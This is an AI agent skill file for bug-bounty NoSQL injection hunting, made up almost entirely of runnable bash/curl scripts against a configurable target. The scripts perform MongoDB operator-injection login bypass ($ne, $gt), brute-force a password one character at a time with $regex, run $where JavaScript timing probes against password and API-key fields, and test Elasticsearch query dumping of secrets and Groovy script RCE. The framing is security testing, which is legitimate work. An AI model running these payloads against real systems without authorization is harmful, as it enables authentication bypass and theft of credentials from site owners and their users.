---
name: k1nzr3c0n-hunt-nosqli
description: "NoSQL Injection hunting skill. Covers MongoDB operator injection ($gt/$ne/$regex/$where), Redis via gopher://, Elasticsearch Groovy RCE (pre-5.0), Cassandra CQL injection. Includes CVE-2024-53900 (Mongoose $where), CVE-2021-22911 (Rocket.Chat MongoDB $regex)."
tags: [nosqli, mongodb, redis, elasticsearch, hunt, web-security, bug-bounty]
report_count: 8
---

# K1NZR3C0N Hunt — NoSQL Injection

> **Operator injection**: MongoDB accepts operators in JSON body — `{"user": {"$gt": ""}}` bypasses auth.
> **$where is RCE-grade**: MongoDB $where executes JavaScript server-side.

---

## Crown Jewels

```
Priority 1 — Auth bypass via $gt/$ne operator injection
Priority 2 — $where JavaScript injection → data exfil / RCE (MongoDB pre-4.4)
Priority 3 — $regex blind enumeration of passwords/secrets
Priority 4 — Redis RCE via SSRF + gopher://
Priority 5 — Elasticsearch Groovy script injection (pre-5.0) → RCE
```

---

## Phase 0 — Bootstrap

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_nosqli_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

# Detect MongoDB/Redis/Elasticsearch from tech stack
RUNS_BASE="/app/runs"
grep -rihE 'mongodb|mongoose|redis|elasticsearch|cassandra|couchdb|dynamodb|firestore' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/nosql_tech.txt"
cat "$HUNT/nosql_tech.txt"
```

## Phase 1 — MongoDB Operator Injection

```bash
echo "=== MongoDB Operator Injection ==="
BASE="https://${TARGET}"

# Login endpoint: try operator in JSON body
AUTH_EP="${AUTH_ENDPOINT:-/api/login}"

# $ne bypass (password not equal to '')
echo "--- Auth bypass via $ne ---"
curl -sk -X POST "${BASE}${AUTH_EP}" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": ""}}' | python3 -m json.tool 2>/dev/null | head -10

# $gt bypass
curl -sk -X POST "${BASE}${AUTH_EP}" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}' | python3 -m json.tool 2>/dev/null | head -10

# $regex blind enumeration
echo "--- $regex password enumeration ---"
for CHAR in a b c d e f 0 1 2 3 4 5 6 7 8 9; do
  RESP=$(curl -sk -X POST "${BASE}${AUTH_EP}" \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": {\"\$regex\": \"^${CHAR}\"}}")
  echo "$RESP" | grep -qi 'token\|success\|true\|200' && echo "  Password starts with: $CHAR"
done

# URL-encoded form variant
echo "--- URL-encoded operator injection ---"
curl -sk -X POST "${BASE}${AUTH_EP}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=admin&password[$ne]=invalid' | head -5

curl -sk "${BASE}/api/users?id[$gt]=0" | python3 -m json.tool 2>/dev/null | head -10
```

## Phase 2 — $where JavaScript Injection (MongoDB < 4.4)

```bash
echo "=== $where JavaScript Injection ==="
# CVE-2024-53900: Mongoose unsanitized $where

# Blind data exfil via sleep timing
for EXPR in \
  "function(){sleep(5000); return true;}" \
  "function(){return this.password.match(/^a/)}" \
  "function(){return this.apiKey.length > 0}"; do
  
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$EXPR")
  T=$(curl -sk -o /dev/null -w '%{time_total}' \
    "https://${TARGET}/api/users?where=${ENCODED}" 2>/dev/null)
  echo "  [${T}s] ${EXPR:0:50}"
done
```

## Phase 3 — Elasticsearch Injection

```bash
echo "=== Elasticsearch Injection ==="
ES_EP="${ES_ENDPOINT:-/api/search}"

# Query injection via _search
curl -sk -X POST "https://${TARGET}${ES_EP}" \
  -H "Content-Type: application/json" \
  -d '{"query": {"query_string": {"query": "* OR _exists_:password"}}}' \
  | python3 -m json.tool 2>/dev/null | grep -E 'password|secret|token' | head -10

# Groovy script injection (ES < 5.0) — RCE
curl -sk -X GET "https://${TARGET}/_search?q=1&size=1" \
  -H "Content-Type: application/json" \
  -d '{"script_fields": {"x": {"script": "def x=new groovy.util.Eval(); return x.x(\"1+1\")"}}}' \
  | grep -i 'script\|groovy\|error'

echo ""
echo "Elasticsearch endpoints to check:"
for EP in /_cluster/health /_nodes /_cat/indices /_search /.kibana/_search; do
  STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "https://${TARGET}${EP}")
  [ "$STATUS" -lt 400 ] && echo "  [$STATUS] $EP"
done
```

## Phase 4 — Gate 0

```bash
echo "=== NoSQLi Gate 0 ==="
echo "  □ Auth bypass: received auth token / session with operator payload"
echo "  □ Data exposure: actual user/password data visible in response"
echo "  □ $where timing: n≥10 trials, consistent 5s delay with sleep(5000)"
echo "  □ ES RCE: command output returned in response"
echo "  □ Two-account: if IDOR via NoSQL — cross-account access confirmed"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
NoSQL Injection (MongoDB operator injection) in [/api/login] allows authentication bypass without password
MongoDB $regex blind injection in [endpoint] enables enumeration of [field] character by character
```
